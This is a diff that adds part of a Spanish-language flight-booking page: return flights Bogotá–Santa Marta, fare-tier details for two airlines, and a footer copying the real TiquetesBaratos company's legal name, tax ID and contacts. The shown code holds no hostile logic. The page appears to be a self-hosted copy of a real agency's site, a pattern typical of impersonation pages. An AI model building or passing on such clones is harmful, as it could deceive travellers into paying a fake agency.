+                <div class="w-full bg-[#d9d2ea] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Flex</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="premium-price">$ 353.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="4" data-aeroline="avi" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+            </div>
+            <div class="rounded-lg shadow mb-3 border border-[#0ff0f] overflow-hidden">
+                <div class="px-3 py-3 flex flex-row items-center justify-between text-lg border-b border-[#0ff0f]">
+                    <div class="w-full flex flex-row gap-5 font-semibold items-center">
+                        <p>17:05</p>
+                        <img src="./assets/svg/plane2_icon.png" width="20px">
+                        <p>18:20</p>
+                    </div>
+                    <p class="font-semibold text-[#2196F3]">Directo</p>
+                </div>
+                <div class="w-full bg-[#ffff54] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Basic</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="basic-price">$ 233.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="1" data-aeroline="avi" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#f8f7fb] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Classic</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="light-price">$ 273.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="2" data-aeroline="avi" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#d9d2ea] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Flex</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="premium-price">$ 353.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="4" data-aeroline="avi" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="avi-ticket-level" class="modal bg-white">
+        <div class="px-5 py-5 text-[#333] border-b poppins-semibold text-lg flex flex-row justify-between items-center">
+            <p>¿Qué incluye cada tarifa?</p>
+            <img onclick="closeModal('avi-ticket-level')" class="w-[22px]" src="./assets/svg/x_gray.png">
+        </div>
+        <div class="flex flex-row overflow-x-scroll px-5 py-5 gap-4">
+            <!-- BASIC -->
+            <div class="min-w-[250px] rounded-lg py-2 px-2 border-2 border-zinc-300 text-xl">
+                <span class="block rounded-full w-[25%] py-1 bg-green-600"></span>
+                <p class="poppins-semibold text-green-600 px-5 py-3">Basic</p>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Asiento </br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Reserva de asiento básico con costo extra</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Articulo Personal</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Checkin</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">No incluido</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Reembolso</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">No incluido</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Cambios</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido antes de la salida del primer vuelo, aplica penalidad</span>
+                    </p>
+                </div>
+            </div>
+
+            <!-- CLASSIC -->
+            <div class="min-w-[250px] rounded-lg py-2 px-2 border-2 border-zinc-300 text-xl">
+                <span class="block rounded-full w-[25%] py-1 bg-[#DC1F2F]"></span>
+                <p class="poppins-semibold text-[#DC1F2F] px-5 py-3">Classic</p>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje de Mano</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 Pieza incluida (10 kg/115 cm lineales)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6 border-b pb-3">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje documentado</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 Pieza incluida (23 kg/158 cm lineales)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Artículo Personal</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Reembolso</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">No incluido antes de la partida / No incluido después de la partida</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Cambios</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Desde $28 USD antes de la partida, aplica términos y condiciones, validar con la aerolínea / Desde $28 USD después de la partida, aplica términos y condiciones, validar con la aerolínea</span>
+                    </p>
+                </div>
+            </div>
+
+            <!-- FLEX -->
+            <div class="min-w-[250px] rounded-lg py-2 px-2 border-2 border-zinc-300 text-xl">
+                <span class="block rounded-full w-[25%] py-1 bg-[#5C469C]"></span>
+                <p class="poppins-semibold text-[#5C469C] px-5 py-3">Flex</p>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje de Mano</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 Pieza incluida (10 kg/115 cm lineales)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6 border-b pb-3">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje Documentado</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 Pieza incluida (23 kg/158 cm lineales)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Artículo Personal</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Reembolsos</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido devolución antes de la salida del primer vuelo                        </span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Cambios</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluidos antes de la partida / No incluidos después de la partida</span>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- JETS -->
+    <div class="flights flights-jet mx-3 mb-5">
+        <div class="px-3 py-3">
+            <img src="./assets/svg/jetsm_logo.png" width="100px">
+        </div>
+        <div class="bg-[#366086] text-white py-3 px-2">
+            <p id="flight-date-label"><b>Bogotá </b>(BOG) - <b>Santa Marta</b>(SMR)</p>
+        </div>
+        <div class="w-full flex flex-row items-center justify-start p-3 cursor-pointer" onclick="openModal('jets-ticket-level')">
+            <div class="px-2 gap-1 w-full flex flex-row shadow-md justify-start items-center">
+                <p class="font-medium text-[#186bdf] underline">¿Qué incluye cada tarifa?</p>
+                <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+            </div>
+        </div>
+        <div class="px-2">
+            <div class="rounded-lg shadow mb-3 border border-[#0ff0f] overflow-hidden">
+                <div class="px-3 py-3 flex flex-row items-center justify-between text-lg border-b border-[#0ff0f]">
+                    <div class="w-full flex flex-row gap-5 font-semibold items-center">
+                        <p>05:45</p>
+                        <img src="./assets/svg/plane2_icon.png" width="20px">
+                        <p>7:00</p>
+                    </div>
+                    <p class="font-semibold text-[#2196F3]">Directo</p>
+                </div>
+                <div class="w-full bg-[#f5f7f9] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Básico</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="basic-price">$ 233.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="1" data-aeroline="jetsm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#e1e5e9] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Standard</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="light-price">$ 273.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="2" data-aeroline="jetsm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#d7dfe7] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Premium</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="premium-price">$ 353.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="4" data-aeroline="jetsm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+            </div>
+            <div class="rounded-lg shadow mb-3 border border-[#0ff0f] overflow-hidden">
+                <div class="px-3 py-3 flex flex-row items-center justify-between text-lg border-b border-[#0ff0f]">
+                    <div class="w-full flex flex-row gap-5 font-semibold items-center">
+                        <p>11:20</p>
+                        <img src="./assets/svg/plane2_icon.png" width="20px">
+                        <p>12:32</p>
+                    </div>
+                    <p class="font-semibold text-[#2196F3]">Directo</p>
+                </div>
+                <div class="w-full bg-[#f5f7f9] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Básico</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="basic-price">$ 233.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="1" data-aeroline="jetsm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#e1e5e9] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Standard</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="light-price">$ 273.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="2" data-aeroline="jetsm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#d7dfe7] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Premium</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="premium-price">$ 353.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="4" data-aeroline="jetsm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="jets-ticket-level" class="modal bg-white">
+        <div class="px-5 py-5 text-[#333] border-b poppins-semibold text-lg flex flex-row justify-between items-center">
+            <p>¿Qué incluye cada tarifa?</p>
+            <img onclick="closeModal('jets-ticket-level')" class="w-[22px]" src="./assets/svg/x_gray.png">
+        </div>
+        <div class="flex flex-row overflow-x-scroll px-5 py-5 gap-4">
+            <!-- BASIC -->
+            <div class="min-w-[250px] rounded-lg py-2 px-2 border-2 border-zinc-300 text-xl">
+                <span class="block rounded-full w-[25%] py-1 bg-green-600"></span>
+                <p class="poppins-semibold text-green-600 px-5 py-3">Básico</p>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Articulo Personal</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida mochila o artículo personal</span>
+                    </p>
+                </div>
+            </div>
+
+            <!-- STANDARD -->
+            <div class="min-w-[250px] rounded-lg py-2 px-2 border-2 border-zinc-300 text-xl">
+                <span class="block rounded-full w-[25%] py-1 bg-[#DC1F2F]"></span>
+                <p class="poppins-semibold text-[#DC1F2F] px-5 py-3">Standard</p>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje de Mano</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida (10 kg.)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Cambios</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido flexismart, aplican términos y condiciones.</span>
+                    </p>
+                </div>
+            </div>
+
+            <!-- PREMIUM -->
+            <div class="min-w-[250px] rounded-lg py-2 px-2 border-2 border-zinc-300 text-xl">
+                <span class="block rounded-full w-[25%] py-1 bg-[#2193E9]"></span>
+                <p class="poppins-semibold text-[#2193E9] px-5 py-3">Premium</p>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje de Mano</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida (10 kg./ cm.)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6 border-b pb-3">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje Documentado</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida (23 kg./ cm.)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Asiento</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Prioridad al abordar</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Cambios</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido flexismart - aplican términos y condiciones</span>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+    <footer class="bg-[#003b98] px-5 py-10 text-white flex flex-col items-center">
+        <img width="100px" src="./assets/svg/tb_icon.png">
+        <div class="mb-4">
+            <p class="mb-2">Síguenos en nuestras redes</p>
+            <img width="130px" src="./assets/svg/redes_icon.png">
+            <p class="mt-2 mb-1">Comunicate con nosotros</p>
+            <img width="90px" src="./assets/svg/canales_icon.png">
+        </div>
+        <div class="w-full">
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Aerolineas destacadas</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Los más vistos</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Sobre tiquetesbaratos.com</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Recursos</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+        </div>
+        <p class="text-sm text-center mt-10">TiquetesBaratos - PRICE RES S.A.S. NIT. 900.474.794-8 , Calle 97A # 8-10 Of
+            204, Bogotá D.C., Bogotá – Colombia, Teléfonos: 601 743 0044. Todos los derechos reservados.Registro
+            Nacional de Turismo No. 44091. soportepqrco@pricetravel.com</p>
+        <p class="text-sm text-center mt-10">En desarrollo de lo dispuesto en el artículo 17 de la ley 679 de 2001, la
+            agencia rechaza la explotación, la pornografía, el turismo sexual y demás formas de abuso sexual con
+            menores, que son sancionados penal y administrativamente conforme a las leyes colombianas.</p>
+    </footer>
+
+
+    <!-- SCRIPTS -->
+    <script src="./js/flight-back.js"></script>
+</body>
+
+</html>
